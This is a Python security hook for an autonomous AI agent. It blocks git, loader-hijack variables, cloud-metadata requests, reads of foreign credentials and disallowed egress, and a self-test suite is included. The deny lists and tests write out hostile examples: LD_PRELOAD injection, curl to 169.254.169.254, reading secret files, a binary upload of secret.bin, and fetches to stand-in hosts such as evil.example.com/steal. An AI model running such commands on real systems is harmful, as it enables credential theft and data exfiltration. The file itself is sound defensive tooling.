#!/usr/bin/env python3
"""
guard.py — PreToolUse security hook for an autonomous agent (P4: guardrails made MECHANICAL).

Wired into the agent's claude session via /agent/.claude/settings.json (the template wires it;
runtime.sh passes --settings). Claude Code runs this BEFORE every matched tool call, passing
{tool_name, tool_input, …} on stdin. Exit 2 + a stderr reason BLOCKS the call (the reason is
fed back to the agent). Critically, PreToolUse hooks STILL FIRE and STILL BLOCK under
`claude -p --dangerously-skip-permissions` — so this is the enforcement layer that survives
permission-bypass, turning brief rules ("never run git", "don't publish live", "scoped
secrets") into mechanical guarantees (hardens SECURITY.md §4: brief-enforced → enforced).

It is DEFENSE-IN-DEPTH, not the only control: the scoped read-only secret MOUNT is still the
primary secret boundary; this just blocks the obvious foot-guns a tool call could attempt.
Fails OPEN on unparseable input (never wedge the agent); deny rules fail CLOSED on match.

  (configured automatically — not run by hand)
Egress allowlist (P1): policies/default-egress.json (override via GUARD_EGRESS_POLICY).
  Report-only by default; set GUARD_EGRESS_ENFORCE=1 to enforce per-agent.

NOTE — no "publish-gate" substring denylist (removed 2026-06-27, operator: "guardrails are
capability removal, not text matching"). The control that actually stops an agent spending the
operator's money is STRUCTURAL: no payment/legal-identity credential is ever mounted into a pod's
scoped /workspace/.secrets (enforced at provisioning — spawn_watcher refuses to stage one). With no
card/token in the container the agent cannot pay, regardless of what it types — and a substring list
("gumroad"/"payout"/…) only false-tripped real work (it cost a slot agent a day on the word "payout")
while being trivially evadable. Removing the *capability* is the guardrail; this hook keeps only the
mechanical controls that have no structural equivalent (git-off, loader-hijack, SSRF-IMDS, egress).
"""
import sys, os, re, json, fnmatch

# Foreign credentials / key stores outside this agent's scoped secrets (the mount already
# limits which .secrets/ files exist; this blocks attempts to reach anything else).
SECRET_DENY = (".ssh/", "id_rsa", "id_ed25519", ".aws/credentials", "/.netrc",
               ".secrets/launcher-master", ".secrets/comms-bridge", ".secrets/github",
               ".secrets/anthropic", ".secrets/google.env",
               # git-push credential (BRAIN/allow_git agents): the agent can `git push` but NOT read the
               # raw token nor run the helper directly — git invokes the helper internally.
               ".secrets/git.env", "gitcreds-helper")
GIT_RE = re.compile(r"(?:^|[;&|]\s*|\s)git(?:\s|$)")

# SSRF → cloud-metadata credential theft (P2, always on). The instance-metadata service
# (169.254.169.254 / metadata.google.internal, identical across AWS/GCP/Azure/OpenStack) hands out
# short-lived cloud credentials to anything that can reach it — an autonomous agent has ZERO
# legitimate reason to, so any reference in a Bash command or a WebFetch url is blocked unconditionally.
# This is the cheapest, highest-leverage egress control: it shuts the canonical SSRF-to-cred-exfil path.
SSRF_METADATA_RE = re.compile(
    r"169\.254\.169\.254"                 # canonical IMDS IPv4 (all major clouds)
    r"|metadata\.google\.internal"        # GCP metadata DNS name
    r"|\bmetadata\.goog\b"                 # GCP short alias
    r"|\[?fd00:ec2::254\]?",              # AWS IMDSv2 IPv6
    re.I)

# Broader private/loopback/link-local egress — OPT-IN (env GUARD_BLOCK_PRIVATE_EGRESS=1), because
# agents legitimately talk to localhost bridges (comms_bridge, cookie-inject, qmd). When enabled, a
# network-fetch command (curl/wget/nc/http client) aimed at an RFC-1918 / loopback / link-local target
# is blocked. Only fires alongside a fetch keyword, so plain `grep localhost file` stays allowed.
PRIVATE_EGRESS_RE = re.compile(
    r"\b(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3}"            # loopback /8
    r"|10\.\d{1,3}\.\d{1,3}\.\d{1,3}"                  # 10/8
    r"|192\.168\.\d{1,3}\.\d{1,3}"                     # 192.168/16
    r"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}"    # 172.16-31/12
    r"|169\.254\.\d{1,3}\.\d{1,3}"                     # link-local /16
    r"|0\.0\.0\.0)\b"
    r"|\blocalhost\b|\[::1\]",
    re.I)
FETCH_CLIENT_RE = re.compile(
    r"\b(?:curl|wget|nc|ncat|netcat|http|https|telnet|ssh|scp|rsync|"
    r"requests\.(?:get|post|put|head)|urllib|httpx|aiohttp|fetch)\b", re.I)

# Loader / interpreter hijack via env injection — block a Bash command that SETS a dynamic-loader
# or interpreter preload/startup var. These smuggle attacker code into the NEXT process (a shared
# lib via LD_PRELOAD/DYLD_*, a JS flag via NODE_OPTIONS, a startup file via BASH_ENV/PYTHONSTARTUP),
# so they would defeat the guard's intent even under --dangerously-skip-permissions. Always on.
LOADER_HIJACK_RE = re.compile(
    r"(?:^|[;&|`(]|\$\(|\bexport\s+|\benv\s+)\s*"
    r"(LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH|"
    r"DYLD_FRAMEWORK_PATH|DYLD_FORCE_FLAT_NAMESPACE|NODE_OPTIONS|BASH_ENV|"
    r"GIT_SSH_COMMAND|PERL5LIB|PYTHONSTARTUP)\s*=",
    re.I)

# --- Read-only cloud policy (opt-in per agent via env GUARD_CLOUD_READONLY=1) -----------------
# For ops/analyst agents doing read-heavy cloud work: the dangerous surface (deploy / IAM / prod
# mutations) is blocked STRUCTURALLY here, atop scoped READ-ONLY creds (the primary control).
# FAIL-SAFE: gcloud/gsutil/bq are denied UNLESS the command matches a known read pattern (an
# unknown verb is blocked, not allowed). Deployment-specific exceptions are env-configurable, not
# baked in: GUARD_BQ_WRITE_TABLE (a single allowed BigQuery DML target) and GUARD_GRAPHQL_HOSTS
# (a regex of API hosts whose write-mutations are gated). Both default to none/generic.
GCLOUD_READ_RE = re.compile(
    r"\bgcloud\b(?!.*\b(deploy|create|delete|update|set-iam-policy|add-iam-policy-binding|"
    r"remove-iam-policy-binding|set\b|enable|disable|patch|import|restore|reset|stop|start|"
    r"kill|remove|add\b|grant|revoke|rotate)\b)"
    r".*\b(logging\s+read|logging\s+tail|list|describe|get|get-value|get-iam-policy|info|"
    r"print-access-token|print-identity-token|projects|organizations|config)\b",
    re.I | re.S)
GSUTIL_READ_RE = re.compile(r"\b(?:gsutil|gcloud\s+storage)\b.*\b(ls|cat|stat|du)\b", re.I | re.S)
DML_RE = re.compile(r"\b(insert\s+into|update\s+|delete\s+from|merge\s+|create\s+|drop\s+|alter\s+|truncate\s+)\b", re.I)
_BQ_WRITE_TABLE = os.environ.get("GUARD_BQ_WRITE_TABLE", "").strip()
BQ_WRITE_OK = re.compile(re.escape(_BQ_WRITE_TABLE), re.I) if _BQ_WRITE_TABLE else None
GRAPHQL_HOST_RE = re.compile(os.environ.get("GUARD_GRAPHQL_HOSTS", "").strip() or r"(?!x)x", re.I)


def decide_cloud_readonly(cmd):
    """Read-only cloud rules over a Bash command. Returns (allow, reason) or (True,'') if N/A."""
    low = cmd.lower()
    # gcloud / gsutil: allow only known reads
    if re.search(r"\bgcloud\b", low) and not re.search(r"\bgcloud\s+storage\b", low):
        if not GCLOUD_READ_RE.search(cmd):
            return False, "gcloud is read-only for this agent — only log/describe/list/get reads are allowed (deploy/IAM/set/create/delete blocked). Scoped SA is read-only too."
    if re.search(r"\bgsutil\b", low) or re.search(r"\bgcloud\s+storage\b", low):
        if not GSUTIL_READ_RE.search(cmd):
            return False, "object-store access is read-only (ls/cat/stat only) — no cp/rm/mv/rsync writes."
    # bq: reads ok; DML blocked unless it targets the single env-configured GUARD_BQ_WRITE_TABLE
    if re.search(r"\bbq\b", low):
        if re.search(r"\bbq\s+(load|cp|rm|mk|mkdef|insert)\b", low):
            return False, "bq write subcommand blocked (load/cp/rm/mk/insert)."
        if re.search(r"\bbq\s+query\b", low) and DML_RE.search(cmd) and not (BQ_WRITE_OK and BQ_WRITE_OK.search(cmd)):
            return False, "bq DML blocked — read queries only (set GUARD_BQ_WRITE_TABLE to allow one write target)."
    # configured API host (GUARD_GRAPHQL_HOSTS): block write-mutations except login/refreshToken auth
    if GRAPHQL_HOST_RE.search(cmd) and re.search(r"\bmutation\b", low):
        if not re.search(r"mutation[^a-z]*\{?\s*(login|refreshtoken)", low):
            return False, "production GraphQL mutations are blocked (read queries only). Only `login`/`refreshToken` mutations are allowed."
    return True, ""


def decide(tool_name, tool_input):
    """PURE allow/deny decision (unit-tested). Returns (allow: bool, reason: str)."""
    cmd = (tool_input.get("command") or "") if tool_name == "Bash" else ""
    path = tool_input.get("file_path") or tool_input.get("path") or tool_input.get("notebook_path") or ""
    url = tool_input.get("url") or ""           # WebFetch / fetch-style tools
    blob = f"{cmd} {path}".lower()
    egress = f"{cmd} {url}"                       # everything that can drive a network request

    # 1) git is disabled for agents BY DEFAULT — their writes persist on their own; the master owns
    #    commits. Opt-in per agent via env GUARD_ALLOW_GIT=1 (e.g. an orchestrator that owns its repos
    #    and is trusted to push). ⚠ This relaxes a core safety boundary — only enable for a trusted agent
    #    with scoped write creds; a prompt-injected agent with git can rewrite/force-push history.
    if tool_name == "Bash" and GIT_RE.search(cmd) and not os.environ.get("GUARD_ALLOW_GIT"):
        return False, ("git is disabled for agents (your writes persist on their own; the master owns the "
                       "repo/commits). Set GUARD_ALLOW_GIT=1 in agent.env to allow git for a trusted agent.")

    # 1b) loader / interpreter hijack via env injection (always on — defeats the guard otherwise)
    if tool_name == "Bash" and LOADER_HIJACK_RE.search(cmd):
        return False, ("setting a dynamic-loader / interpreter env var (LD_PRELOAD / DYLD_* / "
                       "NODE_OPTIONS / BASH_ENV / GIT_SSH_COMMAND / …) is blocked — it smuggles code "
                       "into the next process and would bypass this guard")

    # 1c) SSRF → cloud-metadata credential theft (always on — never legitimate for an agent).
    #     Covers Bash (curl/wget/etc.) AND WebFetch-style url inputs.
    if SSRF_METADATA_RE.search(egress):
        return False, ("reaching the cloud instance-metadata service (169.254.169.254 / "
                       "metadata.google.internal) is blocked — it would hand out cloud credentials "
                       "via SSRF; no agent task needs it")

    # 1d) broader private/loopback/link-local egress (opt-in: GUARD_BLOCK_PRIVATE_EGRESS=1).
    #     Only fires when a network-fetch client is present, so localhost tooling stays usable.
    if os.environ.get("GUARD_BLOCK_PRIVATE_EGRESS") and FETCH_CLIENT_RE.search(egress) and PRIVATE_EGRESS_RE.search(egress):
        return False, ("network egress to a private/loopback/link-local address is blocked for this "
                       "agent (GUARD_BLOCK_PRIVATE_EGRESS) — only public endpoints are allowed")

    # 1e) P1 declarative egress allowlist (host/port/binary). Report-only by default;
    #     GUARD_EGRESS_ENFORCE=1 turns on blocking. Fires only when a URL is detectable.
    if tool_name in ("Bash", "WebFetch"):
        ok, reason = decide_egress_allowlist(tool_name, tool_input, cmd, url)
        if not ok:
            return False, reason

    # 2) foreign credential / key-store access (defense-in-depth atop the scoped mount)
    for pat in SECRET_DENY:
        if pat in blob:
            return False, f"access to '{pat.strip()}' denied — outside this agent's scoped secrets"

    # NB: no "publish-gate" substring rule here — spending the operator's money is prevented
    # STRUCTURALLY (no payment credential mounted into the pod; see module docstring), not by
    # matching command text. A capability the agent doesn't have can't be string-matched around.

    # 3) read-only cloud policy (opt-in per agent): gcloud/gsutil/bq/GraphQL writes blocked
    if tool_name == "Bash" and os.environ.get("GUARD_CLOUD_READONLY"):
        ok, reason = decide_cloud_readonly(cmd)
        if not ok:
            return False, reason

    return True, ""


# ---------------------------------------------------------------------------
# P1 — declarative egress allowlist (host/port/binary dimensions)
# ---------------------------------------------------------------------------
# Default policy file lives beside this script in policies/default-egress.json.
# Override path via GUARD_EGRESS_POLICY env. The policy is read on every call so
# edits apply without a restart (cheap JSON parse: ~0.2ms for our policy size).
#
# REPORT-ONLY by default (GUARD_EGRESS_ENFORCE unset / "0"): would-block events
# are logged to $AGENT_DIR/state/egress-policy.log but the call is NOT blocked.
# Set GUARD_EGRESS_ENFORCE=1 per agent to flip to ENFORCE mode.
#
# The binary dimension: a request is flagged "binary" when POST/PUT body content
# smells like raw binary (large base64 blobs, octet-stream Content-Type, curl
# --data-binary / -F file=@, etc.). Binary uploads to hosts not in binary_allow
# are would-blocked (report) or blocked (enforce). Downloads from any allowed
# host are fine — the concern is exfiltration, not ingestion.

_EGRESS_URL_RE = re.compile(
    r"""(?x)
    https?://                           # scheme
    ([A-Za-z0-9_.\-]+)                 # hostname (group 1)
    (?::(\d+))?                         # optional :port (group 2)
    """)

_BINARY_UPLOAD_RE = re.compile(
    r"""(?x)
    --data-binary                       # curl --data-binary
    |-F\s+\S+=@                         # curl -F field=@file  (multipart binary)
    |--upload-file                      # curl --upload-file
    |-T\s+\S                            # curl -T <file>
    |Content-Type:\s*application/octet-stream   # explicit binary header
    |Content-Type:\s*multipart/form-data        # multipart (likely binary parts)
    """, re.I)

_BASE64_CHUNK_RE = re.compile(r"[A-Za-z0-9+/]{200,}={0,2}")  # large base64 blob


def _load_egress_policy():
    """Load the egress policy JSON (stdlib only, no yaml dep). Returns dict or {}."""
    path = os.environ.get("GUARD_EGRESS_POLICY", "")
    if not path:
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "policies", "default-egress.json")
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return {}   # fail-open: missing/corrupt policy → no allowlist enforcement


def _host_matches(host, pattern):
    """True when hostname matches a glob pattern (fnmatch, case-insensitive)."""
    return fnmatch.fnmatchcase(host.lower(), pattern.lower().lstrip("*").join(["*", ""]
                               ) if not pattern.startswith("*") else pattern.lower(),) \
           if False else fnmatch.fnmatch(host.lower(), pattern.lower())


def _egress_allowed(host, port, policy):
    """Return (host_allowed: bool, binary_allowed: bool) for (host, port) vs policy."""
    allow_rules = policy.get("allow", [])
    host_matched = False
    for rule in allow_rules:
        if _host_matches(host, rule.get("host", "")):
            allowed_ports = rule.get("ports")
            if allowed_ports is None or port is None or port in allowed_ports:
                host_matched = True
                break
    if not host_matched:
        return False, False
    # host is allowed — check binary
    if not policy.get("binary_deny_by_default", False):
        return True, True   # binary_deny_by_default off → binary always ok
    for brule in policy.get("binary_allow", []):
        if _host_matches(host, brule.get("host", "")):
            return True, True
    return True, False       # host allowed, but binary uploads not


def _is_binary_upload(tool_name, tool_input, cmd):
    """Heuristic: is this tool call likely uploading binary content?"""
    if tool_name == "Bash":
        if _BINARY_UPLOAD_RE.search(cmd):
            return True
        if _BASE64_CHUNK_RE.search(cmd):
            return True
    if tool_name == "WebFetch":
        body = str(tool_input.get("body") or "")
        headers = str(tool_input.get("headers") or "")
        if "octet-stream" in headers.lower() or "multipart/form-data" in headers.lower():
            return True
        if _BASE64_CHUNK_RE.search(body) and len(body) > 500:
            return True
    return False


def _egress_log(entry):
    """Append a JSON line to the agent's egress-policy.log (best-effort, never raises)."""
    try:
        log_dir = os.path.join(os.environ.get("AGENT_DIR", "/agent"), "state")
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, "egress-policy.log"), "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


def decide_egress_allowlist(tool_name, tool_input, cmd, url):
    """P1 egress allowlist check. Returns (allow: bool, reason: str).
    In REPORT-ONLY mode always returns (True, '') but logs would-block events.
    In ENFORCE mode (GUARD_EGRESS_ENFORCE=1) returns (False, reason) on violation.
    """
    enforce = os.environ.get("GUARD_EGRESS_ENFORCE", "0") not in ("", "0", "false", "False")
    # Collect candidate (host, port) pairs from the tool inputs
    targets = []
    for m in _EGRESS_URL_RE.finditer(f"{cmd} {url}"):
        host = m.group(1)
        port = int(m.group(2)) if m.group(2) else (443 if "https" in m.group(0) else 80)
        targets.append((host, port, m.group(0)))

    if not targets:
        return True, ""   # no URL found → not an outbound egress call

    policy = _load_egress_policy()
    if not policy:
        return True, ""   # no policy loaded → fail-open

    binary = _is_binary_upload(tool_name, tool_input, cmd)
    violations = []
    for host, port, raw_url in targets:
        host_ok, binary_ok = _egress_allowed(host, port, policy)
        if not host_ok:
            violations.append({"type": "host_not_allowed", "host": host, "port": port})
        elif binary and not binary_ok:
            violations.append({"type": "binary_upload_not_allowed", "host": host, "port": port})

    if not violations:
        return True, ""

    reason = f"egress-policy: {violations[0]['type']} → {violations[0]['host']}:{violations[0]['port']}"
    entry = {"tool": tool_name, "violations": violations, "binary": binary,
             "enforce": enforce, "url_sample": raw_url[:120]}
    _egress_log(entry)

    if enforce:
        return False, (f"[egress-allowlist] {reason} — add this host to "
                       f"platform/agentd/hooks/policies/default-egress.json or set "
                       f"GUARD_EGRESS_POLICY to a custom policy file")
    # report-only: logged above, not blocked
    return True, ""


# ---------------------------------------------------------------------------

def _wasm_sandbox_observe(tool_name, tool_input):
    """Roadmap #7 (flagged, OFF by default, NON-blocking): when ENCLAVE_WASM_SANDBOX=1, record what
    WOULD route to a WASM sandbox so a deployment can measure it before any runtime is wired. The
    WASM runtime itself is gated on a security pass — this never blocks/changes a call. See
    docs/WASM-SANDBOX.md."""
    if os.environ.get("ENCLAVE_WASM_SANDBOX", "0") != "1":
        return
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from sandbox_policy import route
        d = route(tool_name, tool_input)
        if d["would_sandbox"]:
            logp = os.path.join(os.environ.get("AGENT_DIR", "/agent"), "state", "sandbox-routing.log")
            os.makedirs(os.path.dirname(logp), exist_ok=True)
            with open(logp, "a") as f:
                f.write(json.dumps({"tool": tool_name, **d}) + "\n")
    except Exception:
        pass   # observability must never wedge or block a call


def main():
    try:
        data = json.load(sys.stdin)
    except Exception:
        sys.exit(0)   # fail-open: unparseable input must not wedge the agent
    tool_name, tool_input = data.get("tool_name", ""), data.get("tool_input", {}) or {}
    allow, reason = decide(tool_name, tool_input)
    if not allow:
        sys.stderr.write(f"[agent-guard] BLOCKED: {reason}\n")
        sys.exit(2)
    _wasm_sandbox_observe(tool_name, tool_input)
    sys.exit(0)


def _selftest():
    """Unit tests for decide() and decide_egress_allowlist(). Run via: python guard.py --selftest"""
    import traceback
    passed = failed = 0

    def check(name, got, want_allow, want_reason_contains=""):
        nonlocal passed, failed
        allow, reason = got
        ok = (allow == want_allow) and (want_reason_contains in reason)
        if ok:
            passed += 1
        else:
            failed += 1
            print(f"  FAIL [{name}]: got allow={allow!r} reason={reason!r}")

    # --- core decide() rules (regression: must still pass after P1) ---
    # git tests: temporarily clear GUARD_ALLOW_GIT so the block rule fires
    _saved_git = os.environ.pop("GUARD_ALLOW_GIT", None)
    check("git-block",
          decide("Bash", {"command": "git push origin main"}),
          False, "git is disabled")
    os.environ["GUARD_ALLOW_GIT"] = "1"
    check("git-allow-with-env",
          decide("Bash", {"command": "git status"}),
          True)
    if _saved_git is not None:
        os.environ["GUARD_ALLOW_GIT"] = _saved_git
    else:
        os.environ.pop("GUARD_ALLOW_GIT", None)
    check("loader-hijack",
          decide("Bash", {"command": "export LD_PRELOAD=/tmp/evil.so && ls"}),
          False, "dynamic-loader")
    check("ssrf-imds-bash",
          decide("Bash", {"command": "curl http://169.254.169.254/latest/meta-data/"}),
          False, "instance-metadata")
    check("ssrf-imds-webfetch",
          decide("WebFetch", {"url": "http://169.254.169.254/iam/security-credentials/"}),
          False, "instance-metadata")
    check("ssrf-gcp-metadata",
          decide("WebFetch", {"url": "http://metadata.google.internal/computeMetadata/v1/"}),
          False, "instance-metadata")
    check("secret-deny",
          decide("Bash", {"command": "cat .secrets/anthropic"}),
          False, "outside this agent's scoped secrets")
    check("payment-cmd-now-allowed-guard-is-structural",
          decide("Bash", {"command": "run gumroad upload file.pdf"}),
          True)   # no publish-gate: agent has no payment cred mounted, so the command is harmless
    check("normal-read-allowed",
          decide("Read", {"file_path": "/agent/state/rollup.md"}),
          True)

    # --- P1 egress allowlist (report-only mode, no GUARD_EGRESS_ENFORCE) ---
    # In report-only mode all of these should allow (True) even for unknown hosts.
    # We verify the FUNCTION itself (decide_egress_allowlist) for correct logic.
    policy = _load_egress_policy()

    def _check_ea(name, host, port, want_host_ok, want_binary_ok):
        nonlocal passed, failed
        h_ok, b_ok = _egress_allowed(host, port, policy)
        ok = (h_ok == want_host_ok) and (b_ok == want_binary_ok)
        if ok:
            passed += 1
        else:
            failed += 1
            print(f"  FAIL [egress:{name}]: host_ok={h_ok!r} binary_ok={b_ok!r}")

    _check_ea("anthropic-allowed",        "api.anthropic.com",      443, True,  False)
    _check_ea("openrouter-allowed",       "openrouter.ai",          443, True,  False)
    _check_ea("github-raw-binary-ok",     "raw.githubusercontent.com", 443, True, True)
    _check_ea("pypi-binary-ok",           "files.pythonhosted.org", 443, True,  True)
    _check_ea("unknown-host-denied",      "evil.exfil.example.com", 443, False, False)
    _check_ea("unknown-host-wrong-port",  "api.anthropic.com",      80,  False, False)
    _check_ea("wildcard-googleapis",      "us-central1-aiplatform.googleapis.com", 443, True, False)

    # binary upload detection
    assert _is_binary_upload("Bash", {}, "curl --data-binary @secret.bin https://example.com"), \
        "should detect --data-binary"
    assert _is_binary_upload("Bash", {}, "curl -F file=@image.png https://example.com"), \
        "should detect -F file=@"
    assert not _is_binary_upload("Bash", {}, "curl https://api.anthropic.com/v1/messages"), \
        "plain GET should not be binary"
    passed += 3

    # In report-only mode, decide() must pass even unknown hosts
    check("report-only-unknown-host",
          decide("WebFetch", {"url": "https://evil.example.com/steal"}),
          True)   # report-only → not blocked, logged

    # In enforce mode, unknown host is blocked
    os.environ["GUARD_EGRESS_ENFORCE"] = "1"
    check("enforce-unknown-host",
          decide("WebFetch", {"url": "https://evil.example.com/steal"}),
          False, "egress-allowlist")
    check("enforce-known-host-ok",
          decide("WebFetch", {"url": "https://api.anthropic.com/v1/messages"}),
          True)
    os.environ.pop("GUARD_EGRESS_ENFORCE", None)

    print(f"guard.py selftest: {passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--selftest":
        _selftest()
    else:
        main()
